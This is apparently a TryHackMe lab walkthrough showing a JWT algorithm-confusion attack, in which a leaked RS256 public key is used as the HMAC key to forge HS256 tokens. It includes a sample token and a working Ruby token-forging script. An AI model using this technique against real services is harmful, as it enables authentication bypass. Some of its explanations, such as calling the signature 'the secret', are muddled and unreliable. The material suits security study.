# JWT Walkthrough with HS256 algorithm
#pentest/tryhackme

We start off with a basic application
![](JWT%20Walkthrough%20with%20HS256%20algorithm/ygQg3D8.png)

With a JWT, and a JWT verifier. Sending it garbage results in a failure, so let's try decoding the JWT.
![](JWT%20Walkthrough%20with%20HS256%20algorithm/RItwOM3.png)

Decoding the JWT gives us our header, payload, and a bunch of garbage which is the secret.
![](JWT%20Walkthrough%20with%20HS256%20algorithm/wgGLkHA.png)

Unfortunately it seems the algorithm is RS256, which doesn't have any vulnerabilities. **Fortunately for us though, this server leaves its public key lying around, which means we can change the algorithm and sign a new secret!** The first step is to change the algorithm in the header to HS256, and then re encode it in base64. Our new JWT is 

`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vbG9jYWxob3N0IiwiaWF0IjoxNTg1MzIzNzg0LCJleHAiOjE1ODUzMjM5MDQsImRhdGEiOnsiaGVsbG8iOiJ3b3JsZCJ9fQ.FXj9F1jIXlhMyoQAo5-XPOiZeP4Ltw5XXZGqgX49tKkYUOeirOXUDgWL4bqP9nRXIODqOByqS_9O11nQN5bC_LTpfBWG2WZXg0tKIDAbKTxVkrytXBmOkP1qRK_Apv-CQs-mouuS1we8SHYShW_r4DEj0qAF3dsWVVzbRWNMH4Oc_odHNogv00dVlABcxMyXFpNJbeRS6-GCS-A4SFM32gMv_mkfkXrQPdejKDU_sKZrD5VVAmDlu0BainIvD28l8uV3OCc37shtPW0TKoIwUXmGsFYouKqk-h0dz4aTBLKJk7L64XdrA7ts1oOtzk8KqV6gnqXDXUNkzDX3qd9JKA`

The next step is to convert the public key to hex so openssl will use it.
![](JWT%20Walkthrough%20with%20HS256%20algorithm/ZoOsCaO.png) 

(Explanation: a is the file with the public key, `xxd -p` turns the contents of a file to hex, and `tr` is there to get rid of any newlines)
The next step is to use openssl to sign that as a valid HS256 key.
![](JWT%20Walkthrough%20with%20HS256%20algorithm/tYWFci2.png)

Everything is going just fine so far!. The final step is to decode that hex to binary data, and reencode it in base64, luckily python makes this really easy for us.
![](JWT%20Walkthrough%20with%20HS256%20algorithm/XfR9H8t.png)

That's our final secret, now we just put that where the secret should go, and the server should accept it.
So our final JWT would be `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.<payload>.<new secret>`

![](JWT%20Walkthrough%20with%20HS256%20algorithm/mdsgxHx.png)

## Ruby Script
It's not really an exploit and more of an algorithm, the algorithm `HS256`  means that the secret is calculated using the server `public key`, which in certain circumstances we may have access to.

```rb
require 'openssl'
require 'base64'
require 'json'

HMAC_SECRET = <<~DESC
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAqi8TnuQBGXOGx/Lfn4JF
NYOH2V1qemfs83stWc1ZBQFCQAZmUr/sgbPypYzy229pFl6bGeqpiRHrSufHug7c
1LCyalyUEP+OzeqbEhSSuUss/XyfzybIusbqIDEQJ+Yex3CdgwC/hAF3xptV/2t+
H6y0Gdh1weVKRM8+QaeWUxMGOgzJYAlUcRAP5dRkEOUtSKHBFOFhEwNBXrfLd76f
ZXPNgyN0TzNLQjPQOy/tJ/VFq8CQGE4/K5ElRSDlj4kswxonWXYAUVxnqRN1LGHw
2G5QRE2D13sKHCC8ZrZXJzj67Hrq5h2SADKzVzhA8AW3WZlPLrlFT3t1+iZ6m+aF
KwIDAQAB
-----END PUBLIC KEY-----
DESC

def encode(hash_content)
  Base64.encode64(
    JSON.generate(hash_content)
  ).tr('+/', '-_').gsub(/[\n=]/, '')
end

def encode_signature(message)
  digest = OpenSSL::Digest.new('sha256')
  signature = OpenSSL::HMAC.digest(digest, HMAC_SECRET, message)
  Base64.encode64(signature).tr('+/', '-_').gsub(/[\n=]/, '')
end

def jwt(header, payload_hash)
  encoded_header = encode(header)
  encoded_payload = encode(payload_hash)
  encoded_signature = encode_signature(
    [encoded_header, encoded_payload].join('.')
  )

  [encoded_header, encoded_payload, encoded_signature].join('.')
end

puts jwt(
  { typ: 'JWT', alg: 'HS256'},
  { iss: "Paradox", iat: 1592187870, exp: 1592187990, data: { pingu: "noots" } }
)

```

